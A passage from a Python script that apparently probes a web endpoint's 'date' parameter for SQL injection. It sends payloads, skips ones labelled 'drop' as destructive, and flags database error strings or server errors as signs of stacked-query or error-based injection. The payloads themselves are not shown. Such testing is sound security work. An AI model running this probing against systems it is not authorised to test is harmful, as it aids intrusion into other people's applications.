    if 'drop' in desc.lower():
        print(f"[*] {desc}: SKIPPED (destructive)")
        continue
        
    url = f"{REMIND_URL}?date={payload}"
    resp = session.get(url)
    
    sql_errors = re.findall(r'(sqlite|mysql|error|syntax|operational)', resp.text, re.I)
    
    print(f"[*] {desc}: Status={resp.status_code}, SQL errors={sql_errors if sql_errors else 'None'}")
    
    if sql_errors or resp.status_code == 500:
        print(f"[!] STACKED QUERY EXECUTION DETECTED!")
        print(f"    Payload: {payload}")
        print(f"    Response: {resp.text[:2000]}")

print("\n" + "="*70)
print("ANALYSIS SUMMARY")
print("="*70)

# Analyze results
vulnerability_found = False

# Check syntax errors
if any(r['vulnerable'] for r in syntax_results):
    print("[!] Error-based SQL injection: DETECTED")
    vulnerability_found = True
else:
    print("[-] Error-based SQL injection: NOT DETECTED")

